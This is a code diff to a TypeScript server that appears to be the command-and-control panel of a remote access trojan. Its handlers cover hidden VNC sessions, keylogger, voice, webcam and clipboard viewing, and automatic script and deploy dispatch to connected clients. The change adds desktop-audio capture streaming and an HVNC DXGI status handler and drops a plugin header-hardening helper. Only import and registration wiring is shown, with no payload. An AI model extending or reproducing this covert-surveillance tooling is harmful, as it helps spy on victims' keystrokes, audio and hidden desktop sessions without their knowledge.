@@ -39,7 +39,7 @@ import { isAuthorizedAgentRequest } from "./server/agent-auth";
 import { generateBuildMutex, sanitizeMutex, sanitizeOutputName } from "./server/build-utils";
 import { detectUploadOs, normalizeClientOs, type DeployOs } from "./server/deploy-utils";
 import { CORS_HEADERS } from "./server/http-security";
-import { mimeType, secureHeaders, securePluginHeaders } from "./server/http-utils";
+import { mimeType, secureHeaders } from "./server/http-utils";
 import { sanitizePluginId } from "./server/plugin-utils";
 import { dispatchAutoScriptsForConnection } from "./server/auto-script-dispatch";
 import { dispatchAutoDeploysForConnection } from "./server/auto-deploy-dispatch";
@@ -87,6 +87,7 @@ import {
   handleWebcamDevices,
   handleHVNCCloneProgress,
   handleHVNCLookupResult,
+  handleHVNCDXGIStatus,
   handleClipboardContent,
   handleRemoteDesktopViewerMessage,
   handleRemoteDesktopViewerOpen,
@@ -122,6 +123,12 @@ import {
   handleVoiceViewerMessage,
   handleVoiceViewerOpen,
 } from "./server/ws-voice";
+import {
+  cleanupDesktopAudioViewer,
+  handleDesktopAudioUplink,
+  handleDesktopAudioViewerMessage,
+  handleDesktopAudioViewerOpen,
+} from "./server/ws-desktop-audio";
 import { createNotificationPluginHandlers } from "./server/ws-notifications-plugin";
 import { loadOrGenerateVapidKeys } from "./server/web-push";
 import * as clientManager from "./clientManager";
@@ -421,7 +428,6 @@ async function startServer() {
       enqueuePluginEvent: notificationPluginHandlers.enqueuePluginEvent,
       drainPluginUIEvents: notificationPluginHandlers.drainPluginUIEvents,
       secureHeaders,
-      securePluginHeaders,
       mimeType,
     },
     fileShare: {
@@ -496,6 +502,7 @@ async function startServer() {
     handleProcessViewerOpen,
     handleKeyloggerViewerOpen,
     handleVoiceViewerOpen,
+    handleDesktopAudioViewerOpen,
     handleDashboardViewerOpen: (ws: import("bun").ServerWebSocket<SocketData>) => {
       const id = crypto.randomUUID();
       ws.data.sessionId = id;
@@ -564,6 +571,7 @@ async function startServer() {
     handleProcessViewerMessage,
     handleKeyloggerViewerMessage,
     handleVoiceViewerMessage,
+    handleDesktopAudioViewerMessage,
     dispatchAutoScriptsForConnection,
     dispatchAutoDeploysForConnection: (info: import("./types").ClientInfo, ws: import("bun").ServerWebSocket<SocketData>) => {
       const proto = tls ? "https" : "http";
@@ -603,11 +611,14 @@ async function startServer() {
     handlePluginEvent: notificationPluginHandlers.handlePluginEvent,
     handleNotification: notificationPluginHandlers.handleNotification,
     handleVoiceUplink,
+    handleDesktopAudioUplink,
     handleWebcamDevices,
     handleHVNCCloneProgress,
     handleHVNCLookupResult,
+    handleHVNCDXGIStatus,
     handleClipboardContent,
     cleanupVoiceViewer,
+    cleanupDesktopAudioViewer,
     stopConsoleOnTarget,
     sendDesktopCommand,
     sendHVNCCommand,
